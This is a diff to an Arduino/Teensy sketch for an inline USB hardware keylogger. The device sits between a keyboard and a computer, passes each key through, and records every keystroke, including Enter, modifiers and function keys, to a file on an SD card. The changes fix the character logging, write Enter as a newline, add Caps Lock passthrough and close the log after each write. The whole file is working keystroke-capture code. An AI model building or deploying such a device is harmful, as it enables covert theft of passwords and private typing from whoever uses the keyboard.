@@ -1,7 +1,6 @@
 #include <USBHost_t36.h>
 #include <SD.h>
 
-
 //Note: I modified the keyboard.cpp file in /USBHost_t36/keyboard.cpp
 //I commented out lines 256, 265, 275, and 283 
 //Those lines seem to not detect if the function is called, so I jerry rigged a solution for it
@@ -13,14 +12,6 @@ File dataLog;
 USBHost usb;
 KeyboardController keyboard1(usb);
 
-
-/* Problems:
- * Locks dont do anything
- *    scroll lock triggers the right LED, but triggers Caps Lock
- */
-
-const int chipSelect = BUILTIN_SDCARD;
-
 void setup(){
   #ifdef DEBUG
     while (!Serial) ; // wait for Arduino Serial Monitor
@@ -28,28 +19,29 @@ void setup(){
   #endif
   
   usb.begin();
-  // Since modifier keys arent picked up with the regular functions, Ill use a modified version here
+  // Since this function doesnt seem to detect the given function, I modified the library a bit
   keyboard1.attachRawPress(OnRawPress);
   keyboard1.attachRawRelease(OnRawRelease);
-  if (!SD.begin(chipSelect)) return; //restart until SD card found
+  if (!SD.begin(BUILTIN_SDCARD)){
+    Serial.println("No SD Card");
+    return; //restart until SD card found
+  }
   dataLog = SD.open("datalog.txt", FILE_WRITE);
 }
 
-void loop() {
-  usb.Task();
-}
+void loop() {usb.Task();}
 
 void OnRawPress(uint8_t key){
   #ifdef DEBUG
-  Serial.println("Raw-------------------\nKey: " + String(key) + "\n----------------------");
+  Serial.println("Raw-------------------\nKey: " + String((char)(key+93)) + "\n----------------------");
   #endif
   dataLog = SD.open("datalog.txt", FILE_WRITE); //log keystroke to SD card
   switch(key){
     //1,2, and 3 dont seem to be defined
-    case 4 ... 29:   Keyboard.press((char)(key + 93));  dataLog.print((char)key+93);  break; //letters (a:4, z:29)
-    case 30 ... 38:   Keyboard.press((char)(key + 19));  dataLog.print((char)key+19); break; //numbers (1:30 0:39)
+    case 4 ... 29:   Keyboard.press((char)(key + 93));  dataLog.print((char)(key+93));  break; //letters (a:4, z:29)
+    case 30 ... 38:   Keyboard.press((char)(key + 19));  dataLog.print((char)(key+19)); break; //numbers (1:30 0:39)
     case 39:  Keyboard.press(KEY_0);                    dataLog.print("0");           break; //Since ASCII starts with 0 and arduino ends in 0
-    case 40:  Keyboard.press(KEY_ENTER);                dataLog.print("「Enter」");   break;
+    case 40:  Keyboard.press(KEY_ENTER);                dataLog.print("\n");   break;
     case 41:  Keyboard.press(KEY_ESC);                  dataLog.print("「Esc」");     break;
     case 42:  Keyboard.press(KEY_BACKSPACE);            dataLog.print("「Bksp」");     break;
     case 43:  Keyboard.press(KEY_TAB);                  dataLog.print("「Tab」");     break;
@@ -66,7 +58,7 @@ void OnRawPress(uint8_t key){
     case 54:  Keyboard.press(KEY_COMMA);                dataLog.print(",");           break;
     case 55:  Keyboard.press(KEY_PERIOD);               dataLog.print(".");           break;
     case 56:  Keyboard.press(KEY_SLASH);                dataLog.print("/");           break;
-    case 57:                                            dataLog.print("「CpsLck」");  break; 
+    case 57:  Keyboard.press(KEY_CAPS_LOCK);            dataLog.print("「CpsLck」");  break; 
     case 58:  Keyboard.press(KEY_F1);                   dataLog.print("「F1」");      break;
     case 59:  Keyboard.press(KEY_F2);                   dataLog.print("「F2」");      break;
     case 60:  Keyboard.press(KEY_F3);                   dataLog.print("「F3」");      break;
@@ -126,6 +118,7 @@ void OnRawPress(uint8_t key){
       #endif
       break;
   }
+  dataLog.close();
  }
 void OnRawRelease(uint8_t key){
   dataLog = SD.open("datalog.txt", FILE_WRITE); //log keystroke to SD card
@@ -151,7 +144,7 @@ void OnRawRelease(uint8_t key){
     case 54:  Keyboard.release(KEY_COMMA);                break;
     case 55:  Keyboard.release(KEY_PERIOD);               break;
     case 56:  Keyboard.release(KEY_SLASH);                break;
-    case 57:                                              break; 
+    case 57:  Keyboard.release(KEY_CAPS_LOCK);            break; 
     case 58:  Keyboard.release(KEY_F1);                   break;
     case 59:  Keyboard.release(KEY_F2);                   break;
     case 60:  Keyboard.release(KEY_F3);                   break;
@@ -206,4 +199,5 @@ void OnRawRelease(uint8_t key){
     case 109: Keyboard.release(MODIFIERKEY_RIGHT_ALT);    dataLog.print("「↑RAlt」");   break;
     //I think this is all
   }
+  dataLog.close();
 }
